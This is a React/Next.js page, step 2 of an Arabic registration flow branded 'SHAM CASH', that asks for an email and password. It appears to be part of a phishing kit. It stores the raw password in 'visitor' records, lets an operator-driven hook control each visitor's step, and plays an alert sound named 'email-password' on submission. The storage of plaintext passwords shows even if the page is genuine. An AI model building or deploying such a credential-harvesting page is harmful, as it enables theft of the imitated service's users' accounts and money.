'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import StepIndicator from '@/components/StepIndicator';
import Logo from '@/components/Logo';
import FloatingInput from '@/components/FloatingInput';
import { useVisitorContext } from '@/contexts/VisitorContext';
import { useSoundSystem } from '@/hooks/useSound';
import { useVisitorRedirect } from '@/hooks/useVisitorRedirect';

interface FormData {
  email: string;
  password: string;
}

interface FormErrors {
  email?: string;
  password?: string;
}

export default function Step2Page() {
  const router = useRouter();
  const { updateVisitorData, updateVisitorStep } = useVisitorContext();
  const { play } = useSoundSystem();
  useVisitorRedirect(2);
  const [formData, setFormData] = useState<FormData>({
    email: '',
    password: '',
  });
  const [errors, setErrors] = useState<FormErrors>({});
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const validate = (): boolean => {
    const newErrors: FormErrors = {};

    if (!formData.email.trim()) {
      newErrors.email = 'البريد الإلكتروني مطلوب';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email.trim())) {
      newErrors.email = 'البريد الإلكتروني غير صحيح';
    }

    if (!formData.password) {
      newErrors.password = 'كلمة المرور مطلوبة';
    } else if (formData.password.length < 8) {
      newErrors.password = 'كلمة المرور يجب أن تكون 8 أحرف على الأقل';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const isFormValid = (): boolean => {
    return (
      formData.email.trim().length > 0 &&
      /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email.trim()) &&
      formData.password.length >= 8
    );
  };

  const handleChange = (field: keyof FormData, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: undefined }));
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) {
      play('alert');
      return;
    }

    setIsSubmitting(true);
    const visitorId = sessionStorage.getItem('currentVisitorId');
    if (visitorId) {
      await updateVisitorData(visitorId, {
        email: formData.email.trim(),
        password: formData.password,
      });
      await updateVisitorStep(visitorId, 3);
    }
    play('email-password');
    await new Promise((r) => setTimeout(r, 400));
    setIsSubmitting(false);
    router.push('/registration/step-3');
  };

  const EyeBtn = ({ show, toggle }: { show: boolean; toggle: () => void }) => (
    <button type="button" onClick={toggle} className="text-gray-400 hover:text-white transition-colors active:scale-95">
      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        {show ? (
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243-4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
        ) : (
          <>
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
          </>
        )}
      </svg>
    </button>
  );

  const EmailIcon = (
    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
    </svg>
  );
  const LockIcon = (
    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
    </svg>
  );

  return (
    <main className="min-h-screen bg-gradient-to-b from-[#020617] to-[#020c2b] text-white flex flex-col items-center px-4 py-6 sm:py-8" dir="rtl">
      <div className="w-full max-w-md">
        <div className="text-center mb-6 sm:mb-8">
          <Logo size={80} />
          <h1 className="text-xl sm:text-2xl font-bold mt-2 sm:mt-3">SHAM CASH</h1>
          <p className="text-blue-400 text-xs sm:text-sm mt-1">نظام إدارة الزوار والمدفوعات</p>
        </div>

        <div className="text-center mb-6">
          <h2 className="text-lg sm:text-xl font-bold">البريد وكلمة المرور</h2>
          <p className="text-gray-400 text-xs sm:text-sm mt-1">أنشئ حسابك بالبريد الإلكتروني وكلمة المرور</p>
        </div>

        <StepIndicator currentStep={2} />

        <div className="bg-[#0f172a] rounded-2xl p-5 sm:p-6 shadow-lg">
          <form onSubmit={handleSubmit} className="space-y-4" noValidate>
            <FloatingInput
              label="البريد الإلكتروني"
              type="email"
              value={formData.email}
              onChange={(e) => handleChange('email', e.target.value)}
              error={errors.email}
              icon={EmailIcon}
              dir="ltr"
            />
            <FloatingInput
              label="كلمة المرور"
              type={showPassword ? 'text' : 'password'}
              value={formData.password}
              onChange={(e) => handleChange('password', e.target.value)}
              error={errors.password}
              icon={LockIcon}
              rightElement={<EyeBtn show={showPassword} toggle={() => setShowPassword(!showPassword)} />}
            />

            <button
              type="submit"
              disabled={!isFormValid() || isSubmitting}
              className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 disabled:cursor-not-allowed py-3 rounded-xl font-bold flex items-center justify-center gap-2 transition-all duration-200 active:scale-95"
            >
              {isSubmitting ? (
                <>
                  <svg className="animate-spin w-5 h-5" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  جاري...
                </>
              ) : (
                <>
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                  </svg>
                  متابعة
                </>
              )}
            </button>

            <div className="text-center pt-1">
              <Link href="/password-reset" className="text-blue-400 hover:text-blue-300 text-xs sm:text-sm transition-colors">
                نسيت كلمة المرور؟
              </Link>
            </div>
          </form>
        </div>

        <div
          onClick={() => router.back()}
          className="text-center mt-4 sm:mt-6 text-blue-400 cursor-pointer hover:text-blue-300 transition-colors text-xs sm:text-sm active:scale-95"
        >
          ← العودة للخطوة السابقة
        </div>
      </div>
    </main>
  );
}
